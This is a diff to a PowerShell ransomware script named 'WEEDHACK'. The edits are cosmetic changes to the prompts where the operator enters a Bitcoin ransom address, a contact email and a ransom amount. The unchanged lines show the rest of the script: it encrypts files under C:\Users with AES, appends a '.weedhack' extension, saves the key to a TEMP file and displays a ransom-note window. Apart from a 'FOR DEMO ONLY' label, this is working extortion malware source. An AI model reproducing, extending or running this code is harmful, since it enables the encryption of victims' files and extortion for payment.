@@ -2,9 +2,16 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "     WEEDHACK SETUP                    " -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-$btcAddress = Read-Host "Enter YOUR Bitcoin address for ransom payments"
-$contactEmail = Read-Host "Enter YOUR contact email (or press Enter for default)"
-$ransomAmount = Read-Host "Enter ransom amount in BTC (or press Enter for 0.25)"
+
+
+Write-Host "Enter YOUR Bitcoin address for ransom payments:" -ForegroundColor Yellow
+$btcAddress = Read-Host
+
+Write-Host "Enter YOUR contact email (or press Enter for default):" -ForegroundColor Yellow
+$contactEmail = Read-Host
+
+Write-Host "Enter ransom amount in BTC (or press Enter for 0.25):" -ForegroundColor Yellow
+$ransomAmount = Read-Host
 
 if ([string]::IsNullOrWhiteSpace($contactEmail)) {
     $contactEmail = "weedhack@onionmail.org"
@@ -19,12 +26,12 @@ Write-Host "Contact: $contactEmail" -ForegroundColor Yellow
 Write-Host "Amount: $ransomAmount BTC" -ForegroundColor Yellow
 Write-Host ""
 
-$confirm = Read-Host "Proceed with encryption? (yes/no)"
+Write-Host "Proceed with encryption? (yes/no):" -ForegroundColor Red
+$confirm = Read-Host
 if ($confirm -ne "yes") {
     Write-Host "Operation cancelled." -ForegroundColor Red
     exit
 }
-
 
 $Target = "C:\Users"
 $Extension = ".weedhack"
@@ -80,7 +87,6 @@ $keyB64 = [Convert]::ToBase64String($key)
 $ivB64 = [Convert]::ToBase64String($iv)
 "WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension`nPayment Address: $btcAddress`nAmount: $ransomAmount BTC`nContact: $contactEmail" | 
     Out-File "$env:TEMP\WEEDHACK_RECOVERY_KEY.txt"
-
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -143,5 +149,5 @@ $form.Add_Shown({
 [void]$form.ShowDialog()
 
 Write-Host "Ransom note displayed for $Delay seconds" -ForegroundColor Yellow
-Write-Host "Recovery key saved to Desktop (FOR DEMO ONLY)" -ForegroundColor Yellow
+Write-Host "Recovery key saved to TEMP (FOR DEMO ONLY)" -ForegroundColor Yellow
 Write-Host "Your Bitcoin address: $btcAddress" -ForegroundColor Green
